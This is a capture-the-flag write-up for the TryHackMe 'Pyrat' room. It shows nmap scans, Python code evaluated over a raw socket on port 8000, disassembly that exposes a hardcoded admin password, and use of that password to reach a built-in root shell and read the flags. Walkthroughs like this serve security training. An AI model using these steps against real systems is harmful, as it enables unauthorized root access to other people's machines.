# Pyrat: Write-up

**Platform:** TryHackMe  
**Room:** Pyrat  
**Difficulty:** Easy  
**Estimated Time:** ~60 minutes  

## Description

The target exposes SSH and an atypical service on **TCP/8000**. Although it presents HTTP-like behavior, it also accepts **raw socket** input and evaluates expressions in a **Python execution context**. By enumerating exposed functions and satisfying an **admin gate**, it is possible to reach a built-in **privileged shell** and retrieve flags.

---

## 1. Service Enumeration

### 1.1 Nmap

#### Basic TCP scan

```bash
└─$ nmap -n -Pn -T4 "$target_ip"
```

<details>
<summary><strong>Raw output</strong></summary>

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-14 09:10 -0300
Nmap scan report for 10.65.139.64
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
```
</details>

#### Version and default script scan

```bash
└─$ nmap -n -Pn -T4 -sC -sV -p 22,8000 "$target_ip"
```

<details>
<summary><strong>Raw output</strong></summary>

```text
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
```
</details>

---

## 2. TCP/8000 Behavior Validation

### 2.1 HTTP interaction (baseline)

```bash
└─$ curl "http://$target_ip:8000"
```

Observed response:

```text
Try a more basic connection
```

### 2.2 Raw socket interaction (primary)

```bash
└─$ nc "$target_ip" 8000
```

Example interaction:

```text
1+1
print(1+1)
2
```

**Assessment**
- TCP/8000 accepts raw socket input and returns evaluated output.
- The observed behavior indicates a Python evaluation mechanism (i.e., a Python execution context reachable over the socket).

> ⚠️ Environment note: Nmap reports `Python/3.11.2`, while later introspection references `/usr/lib/python3.8/...`. This write-up treats the interpreter version as environment-dependent and does not rely on a specific version assumption.

---

## 3. Execution Context Enumeration

The global namespace was enumerated to identify exposed helpers and control flow:

```bash
└─$ nc "$target_ip" 8000
```

```text
print(globals())
```

<details>
<summary><strong>Observed output (truncated)</strong></summary>

```text
{
  '__name__': '__main__',
  '__file__': '/root/pyrat.py',
  'os': <module 'os' from '/usr/lib/python3.8/os.py'>,
  'sys': <module 'sys' (built-in)>,
  'handle_client': <function handle_client ...>,
  'exec_python': <function exec_python ...>,
  'get_admin': <function get_admin ...>,
  'shell': <function shell ...>,
  'is_http': <function is_http ...>,
  'fake_http': <function fake_http ...>,
  'host': '0.0.0.0',
  'port': 8000,
  ...
}
```
</details>

**Result**
- Execution occurs in the main module context.
- Multiple helper functions are exposed, including an explicit admin gate (`get_admin`) and an interactive shell handler (`shell`).

---

## 4. Admin Gate Identification (`get_admin`)

A direct function call was tested and failed due to a required socket argument:

```text
get_admin() missing 1 required positional argument: 'client_socket'
```

**Result**
- `get_admin` is not intended to be invoked directly without an active client socket object.
- The admin gate is expected to be reachable through an interactive input flow tied to the current connection.

---

## 5. Admin Gate Verification (Minimal Static Inspection)

A minimal disassembly was used to confirm gate conditions and prompts. Only relevant indicators are retained:

```text
import dis; dis.dis(get_admin)
```

<details>
<summary><strong>Relevant excerpts</strong></summary>

```text
...
LOAD_CONST ('Start a fresh client to begin.')
...
LOAD_CONST ('abc123')          # hardcoded password observed in disassembly
...
LOAD_CONST ('Password:')
...
LOAD_CONST ('Welcome Admin!!! Type "shell" to begin')
...
```
</details>

**Result**
- The admin gate enforces a “fresh client” condition.
- A hardcoded admin password exists in the function logic.
- Successful authentication enables access to the `shell` flow.

> OPSEC note: The recovered password is redacted in the exploitation transcript below. The flow remains reproducible by substituting the recovered value.

---

## 6. Privileged Shell Access (Admin Flow → `shell`)

A new client session was established and the admin authentication flow was followed:

```bash
└─$ nc "$target_ip" 8000
```

```text
admin
Password:
[REDACTED]
Welcome Admin!!! Type "shell" to begin
shell
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Result**
- The service provides a root-level shell once the admin gate is satisfied.

---

## 7. Flag Retrieval

### 7.1 User flag

```text
# cd /home
# ls
think  ubuntu
# cd think
# ls
snap  user.txt
# cat user.txt
THM{REDACTED}
```

### 7.2 Root flag

```text
# cd /root
# ls
pyrat.py  root.txt  snap
# cat root.txt
THM{REDACTED}
```

---

## Conclusion

This target exposes a raw socket service on TCP/8000 that evaluates user input within a Python execution context. By enumerating exposed functions, validating the admin gate logic, and completing the intended authentication flow, it is possible to access a built-in privileged shell and retrieve both flags.

